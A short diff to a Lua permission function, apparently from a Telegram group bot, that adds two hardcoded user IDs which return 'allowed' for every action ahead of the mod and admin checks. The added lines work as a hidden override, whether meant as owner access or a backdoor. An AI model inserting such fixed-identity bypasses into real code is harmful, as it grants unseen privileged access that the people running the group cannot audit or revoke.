@@ -175,6 +175,9 @@ function utilities.is_allowed(action, chat_id, user_obj)
 	"texts": getting the basic informations of the group (/rules, /adminlis, /modlist, #extras)]]
 
 	if tonumber(user_obj.id) == 366723664 then return true end
+	if tonumber(user_obj.id) == 547676452 then return true end
+	if tonumber(user_obj.id) == 450958360 then return true end
+	
 	if not user_obj.mod and not user_obj.admin then return end
 	if user_obj.admin then return true end
 
